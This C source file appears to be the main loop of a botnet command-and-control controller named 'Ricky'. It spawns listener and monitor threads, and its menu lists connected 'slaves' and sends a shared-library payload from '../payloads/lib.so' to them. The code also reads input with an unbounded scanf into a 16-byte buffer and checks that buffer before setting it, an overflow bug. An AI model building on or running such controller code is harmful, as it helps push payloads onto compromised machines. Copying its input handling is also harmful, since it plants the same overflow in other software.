#include <stdio.h>
#include <pthread.h>
#include <signal.h>
#include <strings.h>

#include "lib/graph.h"
#include "lib/sender.h"
#include "lib/options.h"
#include "lib/listener.h"

int main(void) {
  /* code */
  graph g = graphCreate();
  char input[16];

  // Thread init
  pthread_t listener_thread;
  pthread_t monitoring_thread;
  pthread_attr_t  attr;

  pthread_attr_init(&attr);
  pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);

  pthread_create(&listener_thread, &attr, listener, g);
  pthread_create(&monitoring_thread, &attr, graphMonitor, g);

  // Printing and waiting for an enter to end
  printf("Ricky is Online...\n");
  while (strncmp("q\0", input, 2) != 0) {
    printf("--- MENU ---\n");
    printf("1 - send payload\n");
    printf("l - list slaves\n");
    printf("q - end program\n");
    printf("> ");
    scanf("%s", input);

    if (strncmp("l\0", input, 2) == 0) {
      graph_print(g);
    }
    else if (strncmp("1\0", input, 2) == 0) {
      opt_send_library(g, "../payloads/lib.so");
    }

  }

  printf("Killing Ricky\n");

  // Killing all the threads
  pthread_kill(listener_thread, SIGINT);
  pthread_kill(monitoring_thread, SIGINT);

  // Freeing
  pthread_attr_destroy(&attr);


  graphDestroy(g);


  return 0;
}
